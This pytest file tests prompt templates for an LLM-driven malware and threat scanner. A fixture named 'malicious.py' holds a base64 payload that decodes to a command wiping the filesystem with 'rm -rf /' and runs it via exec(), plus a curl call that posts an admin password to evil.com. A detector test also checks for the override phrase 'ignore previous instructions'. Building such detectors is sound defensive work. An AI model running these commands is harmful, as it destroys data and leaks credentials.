"""
Tests for LLM prompt templates and Phase 9 functionality.
"""

import pytest

from api.prompts.security_analysis_prompts import SecurityAnalysisPrompts
from api.prompts.threat_detection_prompts import ThreatDetectionPrompts


class TestSecurityAnalysisPrompts:
    """Test security analysis prompt generation."""

    def test_system_prompt_format(self):
        """Test that system prompt is well-formatted."""
        prompt = SecurityAnalysisPrompts.get_system_prompt()

        assert len(prompt) > 100, "System prompt should be comprehensive"
        assert "cybersecurity expert" in prompt.lower()
        assert "false positive" in prompt.lower()
        assert "accuracy over speed" in prompt.lower()

    def test_zero_day_detection_prompt(self):
        """Test zero-day detection prompt content."""
        prompt = SecurityAnalysisPrompts.get_zero_day_detection_prompt()

        assert "zero-day" in prompt.lower()
        assert "logic flaw" in prompt.lower()
        assert "race condition" in prompt.lower()
        assert "attack vector" in prompt.lower()

    def test_obfuscation_analysis_prompt(self):
        """Test obfuscation analysis prompt content."""
        prompt = SecurityAnalysisPrompts.get_obfuscation_analysis_prompt()

        assert "obfuscation" in prompt.lower()
        assert "base64" in prompt.lower()
        assert "steganography" in prompt.lower()
        assert "deobfuscation" in prompt.lower()

    def test_behavioral_pattern_prompt(self):
        """Test behavioral pattern analysis prompt."""
        prompt = SecurityAnalysisPrompts.get_behavioral_pattern_prompt()

        assert "behavioral pattern" in prompt.lower()
        assert "exfiltration" in prompt.lower()
        assert "persistence" in prompt.lower()
        assert "command & control" in prompt.lower()

    def test_supply_chain_risk_prompt(self):
        """Test supply chain risk assessment prompt."""
        prompt = SecurityAnalysisPrompts.get_supply_chain_risk_prompt()

        assert "supply chain" in prompt.lower()
        assert "dependency" in prompt.lower()
        assert "typosquatting" in prompt.lower()
        assert "build system" in prompt.lower()

    def test_ai_attack_vector_prompt(self):
        """Test AI/ML attack vector prompt."""
        prompt = SecurityAnalysisPrompts.get_ai_attack_vector_prompt()

        assert "prompt injection" in prompt.lower()
        assert "model poisoning" in prompt.lower()
        assert "jailbreaking" in prompt.lower()
        assert "ai agent" in prompt.lower()

    def test_contextual_correlation_prompt(self):
        """Test contextual correlation analysis prompt."""
        prompt = SecurityAnalysisPrompts.get_contextual_correlation_prompt()

        assert "contextual" in prompt.lower()
        assert "correlation" in prompt.lower()
        assert "attack chain" in prompt.lower()
        assert "multi-stage" in prompt.lower()

    def test_build_analysis_prompt(self):
        """Test comprehensive prompt building."""
        file_contents = {
            "test.py": "import os\npassword = os.environ.get('PASSWORD')",
            "config.json": '{"api_key": "secret123"}',
        }

        static_findings = [
            {
                "severity": "MEDIUM",
                "description": "Environment variable access",
                "file": "test.py",
            }
        ]

        repository_context = {"name": "test-repo", "target_type": "directory"}

        prompt = SecurityAnalysisPrompts.build_analysis_prompt(
            analysis_types=["zero_day_detection", "supply_chain_risk"],
            file_contents=file_contents,
            static_findings=static_findings,
            repository_context=repository_context,
        )

        # Check that all components are included
        assert "cybersecurity expert" in prompt
        assert "zero_day_detection" in prompt
        assert "supply_chain_risk" in prompt
        assert "test.py" in prompt
        assert "Environment variable access" in prompt
        assert "test-repo" in prompt
        assert "JSON" in prompt  # Response format


class TestThreatDetectionPrompts:
    """Test specialized threat detection prompts."""

    def test_prompt_injection_detector(self):
        """Test prompt injection detection prompt."""
        prompt = ThreatDetectionPrompts.get_prompt_injection_detector()

        assert "prompt injection" in prompt.lower()
        assert "ignore previous instructions" in prompt.lower()
        assert "jailbreaking" in prompt.lower()
        assert "unsanitized user input" in prompt.lower()

    def test_time_bomb_detector(self):
        """Test time bomb detection prompt."""
        prompt = ThreatDetectionPrompts.get_time_bomb_detector()

        assert "time bomb" in prompt.lower()
        assert "logic bomb" in prompt.lower()
        assert "delayed" in prompt.lower()
        assert "date/time comparison" in prompt.lower()

    def test_steganography_detector(self):
        """Test steganography detection prompt."""
        prompt = ThreatDetectionPrompts.get_steganography_detector()

        assert "steganography" in prompt.lower()
        assert "whitespace pattern" in prompt.lower()
        assert "hidden" in prompt.lower()
        assert "covert channel" in prompt.lower()

    def test_cryptocurrency_miner_detector(self):
        """Test cryptocurrency mining detection prompt."""
        prompt = ThreatDetectionPrompts.get_cryptocurrency_miner_detector()

        assert "cryptocurrency" in prompt.lower()
        assert "mining" in prompt.lower()
        assert "cpu" in prompt.lower()
        assert "hash" in prompt.lower()

    def test_data_exfiltration_detector(self):
        """Test data exfiltration detection prompt."""
        prompt = ThreatDetectionPrompts.get_data_exfiltration_detector()

        assert "data exfiltration" in prompt.lower()
        assert "collection" in prompt.lower()
        assert "transmission" in prompt.lower()
        assert "dns tunneling" in prompt.lower()

    def test_backdoor_detector(self):
        """Test backdoor detection prompt."""
        prompt = ThreatDetectionPrompts.get_backdoor_detector()

        assert "backdoor" in prompt.lower()
        assert "authentication bypass" in prompt.lower()
        assert "persistence" in prompt.lower()
        assert "remote access" in prompt.lower()

    def test_supply_chain_detector(self):
        """Test supply chain attack detection prompt."""
        prompt = ThreatDetectionPrompts.get_supply_chain_detector()

        assert "supply chain" in prompt.lower()
        assert "dependency confusion" in prompt.lower()
        assert "typosquatting" in prompt.lower()
        assert "build system" in prompt.lower()

    def test_apt_detector(self):
        """Test APT detection prompt."""
        prompt = ThreatDetectionPrompts.get_advanced_persistent_threat_detector()

        assert "advanced persistent threat" in prompt.lower()
        assert "apt" in prompt.lower()
        assert "multi-stage" in prompt.lower()
        assert "living-off-the-land" in prompt.lower()


@pytest.mark.asyncio
class TestPromptIntegration:
    """Test prompt integration with actual analysis."""

    async def test_prompt_generates_valid_json_structure(self):
        """Test that prompts guide toward valid JSON responses."""

        # Simulate a small analysis request
        file_contents = {
            "malicious.py": """
import base64
import subprocess
import os

# Suspicious base64 encoded string
encoded = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="
decoded = base64.b64decode(encoded)
exec(decoded)

# Environment access
password = os.environ.get('ADMIN_PASSWORD')
if password:
    subprocess.call(['curl', '-X', 'POST', 'http://evil.com/data', '-d', password])
"""
        }

        static_findings = [
            {
                "severity": "HIGH",
                "description": "Base64 decoding detected",
                "file": "malicious.py",
                "rule": "obf-base64-decode",
            },
            {
                "severity": "HIGH",
                "description": "Dynamic code execution via exec()",
                "file": "malicious.py",
                "rule": "code-exec",
            },
            {
                "severity": "MEDIUM",
                "description": "Environment variable access",
                "file": "malicious.py",
                "rule": "cred-env-access",
            },
        ]

        repository_context = {
            "name": "suspicious-package",
            "target_type": "python_package",
        }

        # Build a comprehensive analysis prompt
        prompt = SecurityAnalysisPrompts.build_analysis_prompt(
            analysis_types=[
                "zero_day_detection",
                "obfuscation_analysis",
                "behavioral_pattern",
                "contextual_correlation",
            ],
            file_contents=file_contents,
            static_findings=static_findings,
            repository_context=repository_context,
        )

        # Verify prompt structure
        assert len(prompt) > 1000, "Comprehensive prompt should be detailed"
        assert "malicious.py" in prompt, "File should be referenced"
        assert "Base64 decoding detected" in prompt, (
            "Static findings should be included"
        )
        assert "suspicious-package" in prompt, "Repository context should be included"

        # Check for JSON response structure guidance
        assert '"insights"' in prompt, "Should guide toward insights structure"
        assert '"context_analysis"' in prompt, "Should guide toward context analysis"
        assert '"confidence"' in prompt, "Should guide toward confidence scoring"
        assert '"threat_category"' in prompt, (
            "Should guide toward threat categorization"
        )

        # Verify security analysis focus areas are covered
        assert "zero_day" in prompt.lower(), "Zero-day analysis should be included"
        assert "obfuscation" in prompt.lower(), (
            "Obfuscation analysis should be included"
        )
        assert "behavioral" in prompt.lower(), "Behavioral analysis should be included"
        assert "contextual" in prompt.lower(), "Contextual analysis should be included"

    def test_prompt_scalability(self):
        """Test prompt handling with large codebases."""

        # Simulate a large number of files
        file_contents = {}
        static_findings = []

        for i in range(100):
            file_contents[f"file_{i}.py"] = (
                f"# File {i}\nimport os\nprint('Hello {i}')" * 100
            )
            static_findings.append(
                {
                    "severity": "LOW",
                    "description": f"Import in file {i}",
                    "file": f"file_{i}.py",
                }
            )

        # Build prompt
        prompt = SecurityAnalysisPrompts.build_analysis_prompt(
            analysis_types=["contextual_correlation"],
            file_contents=file_contents,
            static_findings=static_findings,
            repository_context={"name": "large-repo"},
        )

        # Should handle large inputs gracefully
        assert len(prompt) < 50000, "Prompt should be truncated for large inputs"
        assert "TRUNCATED" in prompt, "Should indicate truncation"
        assert "100" in prompt, "Should mention file count"

    def test_empty_input_handling(self):
        """Test prompt generation with empty inputs."""

        prompt = SecurityAnalysisPrompts.build_analysis_prompt(
            analysis_types=[],
            file_contents={},
            static_findings=[],
            repository_context={},
        )

        # Should still generate a valid prompt
        assert len(prompt) > 100, "Should have base system prompt"
        assert "cybersecurity expert" in prompt.lower()
        assert "JSON" in prompt, "Should still request JSON format"
